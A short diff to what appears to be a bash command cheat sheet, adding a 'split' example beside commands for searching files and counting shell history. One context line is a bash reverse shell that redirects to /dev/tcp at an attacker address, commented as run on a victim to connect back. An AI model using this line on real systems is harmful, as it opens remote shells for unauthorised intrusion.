@@ -202,4 +202,4 @@ find / \( -path /proc -o -path /sys \) -prune -o -print # Search the file system
 history | awk '{print $2}' | sort | uniq -c | sort -rn | head -10 # Count and show most popular bash_history entries
 
 /bin/bash -i > /dev/tcp/10.10.10.10/8080 0<&1 2>&1   # Reverse shell. Run this on victim IP to connect back to hacker IP
-
+split --lines=50 foo.txt  # Split a text file into files with 50 lines each
